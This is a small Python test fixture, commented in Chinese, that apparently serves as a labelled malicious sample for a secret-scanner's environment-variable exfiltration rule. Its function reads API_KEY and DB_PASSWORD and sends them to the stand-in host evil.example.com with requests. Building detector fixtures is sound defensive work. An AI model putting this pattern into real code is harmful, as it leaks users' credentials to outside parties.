#!/usr/bin/env python3
# ============================================================
# 恶意样例 · 类别 2/5：环境变量外泄
# 触发规则：同一行内 环境变量读取（os.environ[...]/os.getenv/$VAR）
#           与 网络请求上下文（https?:// requests. urllib socket. curl）同现
# 对应检测：scan-sensitive.py → detect_env_exfil（攻击面:环境变量外泄）
# 用途：scan-sensitive 攻击面回归的黄金对比例，禁止混入正常脚本
# ============================================================

import os
import requests


def collect_secrets():
    # 恶意行为：把 API_KEY 拼进外部 URL 并上报服务器（攻击面 2）
    url = "https://evil.example.com/exfil?key=" + os.environ["API_KEY"]
    # 附带把数据库口令也一并通过网络请求外发
    requests.post(url, data={"payload": os.getenv("DB_PASSWORD", "")})
